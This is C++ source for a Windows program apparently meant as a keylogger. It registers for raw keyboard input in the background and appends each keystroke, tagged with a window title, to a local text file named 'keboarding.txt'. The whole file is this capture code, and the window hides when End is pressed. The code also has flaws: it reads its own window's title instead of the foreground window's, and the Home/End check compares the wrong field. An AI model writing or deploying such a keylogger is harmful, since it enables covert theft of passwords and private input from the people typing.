#include <windows.h>
#include <locale.h>
#include "vkey.h"
LONG WINAPI WndProc (HWND, UINT, WPARAM, LPARAM);

HANDLE g_handle_SaveFile ;
HANDLE fun_InitFile(void) ;
BOOL fun_RegisterKeyBoard(HWND hwnd) ;
BOOL Format_ErrorMessage(DWORD dword_ErrorCode) ;
int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpszCmdLine, int nCmdShow)
{
	WNDCLASS wc;
	HWND hwnd;
	MSG msg;

	setlocale(LC_ALL,"chs") ;
	wc.style = 0;                                   // Class style
	wc.lpfnWndProc = (WNDPROC) WndProc;             // Window procedure address
	wc.cbClsExtra = 0;                              // Class extra bytes
	wc.cbWndExtra = 0;                              // Window extra bytes
	wc.hInstance = hInstance;                       // Instance handle
	wc.hIcon = LoadIcon (NULL, IDI_WINLOGO);        // Icon handle
	wc.hCursor = LoadCursor (NULL, IDC_ARROW);      // Cursor handle
	wc.hbrBackground = (HBRUSH) (COLOR_WINDOW + 1); // Background color
	wc.lpszMenuName = NULL;                         // Menu name
	wc.lpszClassName = L"MyWndClass";                // WNDCLASS name

	RegisterClass (&wc);



	hwnd = CreateWindow (
		L"MyWndClass",               // WNDCLASS name
		L"SDK Application",          // Window title
		WS_OVERLAPPEDWINDOW,        // Window style
		CW_USEDEFAULT,              // Horizontal position
		CW_USEDEFAULT,              // Vertical position        
		CW_USEDEFAULT,              // Initial width
		CW_USEDEFAULT,              // Initial height
		HWND_DESKTOP,               // Handle of parent window
		NULL,                       // Menu handle
		hInstance,                  // Application's instance handle
		NULL                        // Window-creation data
		);

	g_handle_SaveFile = fun_InitFile();

	if (!fun_RegisterKeyBoard(hwnd))
	{
		MessageBox(hwnd,L"注册键盘原始输入设备失败",L"Raw Input Test",0) ;
		return 0 ;
	}

	ShowWindow (hwnd, nCmdShow);
	UpdateWindow (hwnd);

	while (GetMessage (&msg, NULL, 0, 0)) {
		TranslateMessage (&msg);
		DispatchMessage (&msg);
	}
	return msg.wParam;
}

LRESULT CALLBACK WndProc (HWND hwnd, UINT message, WPARAM wParam,
	LPARAM lParam)
{
	PAINTSTRUCT ps;
	HDC hdc;

	wchar_t wchar_virtualkey [MAX_PATH] = {L'\0'} ;
	HWND hwnd_CurrentWindow = NULL ;
	wchar_t wchar_title [128] = {L'\0'} ;

	UINT uint_Size ;
	LPBYTE lpbyte_raw_input = NULL ;
	RAWINPUT * struct_RawInp = NULL ;
	DWORD dword_Written = 0 ;

	switch (message) {

	case WM_PAINT:
		hdc = BeginPaint (hwnd, &ps);
		EndPaint (hwnd, &ps);
		return 0;

	case WM_INPUT:
		GetRawInputData((HRAWINPUT)lParam,RID_INPUT,NULL,&uint_Size,sizeof(RAWINPUTHEADER)) ;
		lpbyte_raw_input = new BYTE [uint_Size] ;
		memset(lpbyte_raw_input,0,uint_Size * sizeof(BYTE)) ;
		if (lpbyte_raw_input == NULL)
		{
			DefWindowProc(hwnd,message,wParam,lParam) ;
			return  0 ;
		}

		GetRawInputData((HRAWINPUT)lParam,RID_INPUT,lpbyte_raw_input,&uint_Size,
			sizeof(RAWINPUTHEADER)) ;

		struct_RawInp = (RAWINPUT *)lpbyte_raw_input ;
		if (struct_RawInp->header.dwType == RIM_TYPEKEYBOARD)
		{
			hwnd_CurrentWindow = GetForegroundWindow() ;
			GetWindowText(hwnd,wchar_title,128) ;

			wsprintf(wchar_virtualkey,L"[%ls]:%ls\r\n",wchar_title,
				GetKeyName(struct_RawInp->data.keyboard.VKey)) ;

			if ((g_handle_SaveFile != INVALID_HANDLE_VALUE) &&
				((WM_KEYDOWN == struct_RawInp->data.keyboard.Message) ||
				(WM_SYSKEYDOWN == struct_RawInp->data.keyboard.Message)) &&
				(0xff != struct_RawInp->data.keyboard.VKey))
			{
				SetFilePointer(g_handle_SaveFile,0,NULL,FILE_END) ;
				WriteFile(g_handle_SaveFile,wchar_virtualkey,
					wcslen(wchar_virtualkey) * 2,&dword_Written,NULL) ;
			}

			if (VK_HOME == struct_RawInp->data.keyboard.Message)
			{
				ShowWindow(hwnd,SW_NORMAL) ;
			}

			if (VK_END == struct_RawInp->data.keyboard.Message)
			{
				ShowWindow(hwnd,SW_HIDE) ;
			}
		}

		delete [] lpbyte_raw_input ;


		DefWindowProc(hwnd,message,wParam,lParam) ;
		return 0 ;

	case WM_DESTROY:
		CloseHandle(g_handle_SaveFile);

		PostQuitMessage (0);
		return 0;
	}
	return DefWindowProc (hwnd, message, wParam, lParam);
}





HANDLE fun_InitFile()
{
	HANDLE handle_File = CreateFile(L"keboarding.txt",FILE_ALL_ACCESS,FILE_SHARE_WRITE,
		NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL) ;

	if (handle_File == INVALID_HANDLE_VALUE)
	{
		Format_ErrorMessage(GetLastError()) ;
	}

	return handle_File ;
}



BOOL fun_RegisterKeyBoard(HWND hwnd)
{
	if (NULL == hwnd)
		return false ;


	RAWINPUTDEVICE struct_RawInpDev ;
	struct_RawInpDev.usUsagePage	= 0x01 ;
	struct_RawInpDev.usUsage		= 0x06 ;
	struct_RawInpDev.dwFlags		= RIDEV_INPUTSINK ;
	struct_RawInpDev.hwndTarget		= hwnd ;

	return RegisterRawInputDevices(&struct_RawInpDev,1,
		sizeof(RAWINPUTDEVICE));
}

BOOL Format_ErrorMessage(DWORD dword_ErrorCode)
{
	TCHAR * tchar_ErrorMessage ;
	FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER|FORMAT_MESSAGE_FROM_SYSTEM,
		NULL,dword_ErrorCode,0,(LPTSTR)&tchar_ErrorMessage,0,
		NULL) ;

	// wprintf(L"%s",tchar_ErrorMessage) ;

	MessageBox(NULL,tchar_ErrorMessage,L"error report",0) ;
	LocalFree(tchar_ErrorMessage) ;
	return true ;
}